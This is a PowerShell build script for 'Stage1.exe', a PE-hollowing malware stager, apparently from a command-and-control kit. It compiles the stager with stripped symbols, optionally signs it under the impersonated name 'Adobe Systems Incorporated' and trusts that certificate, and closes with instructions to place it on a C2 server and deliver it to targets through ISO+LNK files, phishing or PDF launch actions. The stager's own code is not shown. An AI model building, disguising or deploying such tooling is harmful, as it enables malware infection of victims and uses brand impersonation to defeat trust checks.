# Build Stage1.exe — minimal PE-hollowing stager
# No CryptoPP needed. Links only WinHTTP + system DLLs.
#
# Usage:
#   .\build.ps1
#   .\build.ps1 -MinGW "C:\mingw64"
#   .\build.ps1 -Sign          # Authenticode-sign after build
#   .\build.ps1 -Sign -Install # also trust the cert on this machine (run as Admin)

param(
    [string]$MinGW   = "",
    [switch]$Sign,
    [switch]$Install
)

$StageDir = $PSScriptRoot
Set-Location $StageDir

# Auto-detect MinGW
if (-not $MinGW) {
    $candidates = @(
        "C:\MinGW","C:\mingw64","C:\msys64\mingw64",
        "C:\msys64\ucrt64","C:\mingw-w64"
    )
    foreach ($c in $candidates) {
        if (Test-Path "$c\bin\g++.exe") { $MinGW = $c; break }
    }
    if (-not $MinGW) {
        $g = Get-Command g++ -ErrorAction SilentlyContinue
        if ($g) { $MinGW = Split-Path (Split-Path $g.Source) }
    }
    if (-not $MinGW) {
        Write-Host "ERROR: MinGW g++ not found." -ForegroundColor Red
        Write-Host "Add it to PATH or pass -MinGW <path>."
        exit 1
    }
}
$env:PATH = "$MinGW\bin;$env:PATH"
Write-Host "[INFO] MinGW: $MinGW"

Write-Host "[1/3] Compiling resource file..."
windres Stage1.rc -o Stage1_res.o
if ($LASTEXITCODE -ne 0) { Write-Host "windres failed" -ForegroundColor Red; exit 1 }

Write-Host "[2/3] Compiling Stage1.cpp..."

$compArgs = @(
    'Stage1.cpp', 'Stage1_res.o',
    '-std=c++17', '-O2', '-mwindows',
    '-s', '-fno-ident',
    '-ffunction-sections', '-fdata-sections',
    '-Wl,--gc-sections',
    '-static-libgcc', '-static-libstdc++',
    '-lkernel32',
    '-o', 'Stage1.exe'
)

& g++ @compArgs
Remove-Item Stage1_res.o -ErrorAction SilentlyContinue

if ($LASTEXITCODE -ne 0) {
    Write-Host "Build FAILED" -ForegroundColor Red
    exit 1
}

Write-Host "[3/3] Done." -ForegroundColor Green
$sz = [math]::Round((Get-Item "Stage1.exe").Length / 1024)
Write-Host "Stage1.exe: $sz KB"

# ── Authenticode signing ───────────────────────────────────────────────────────
if ($Sign) {
    $signScript = "$PSScriptRoot\..\sign.ps1"
    if (Test-Path $signScript) {
        $signArgs = @(
            "-Files", (Resolve-Path "Stage1.exe").Path,
            "-Subject", "Adobe Systems Incorporated",
            "-PfxPath", "$PSScriptRoot\..\sign.pfx"
        )
        if ($Install) { $signArgs += "-Install" }
        & powershell -ExecutionPolicy Bypass -File $signScript @signArgs
    } else {
        Write-Host "[sign] sign.ps1 not found at $signScript" -ForegroundColor Yellow
    }
}

Write-Host ""
Write-Host "Next steps:"
Write-Host "  1. Copy Stage1.exe  ->  c2-server\downloads\Stage1.exe"
Write-Host "  2. Deliver Stage1.exe to target (ISO+LNK, phish, PDF /Launch)"
Write-Host "  3. Watch Stager tab for check-in + stage 2 fetch"
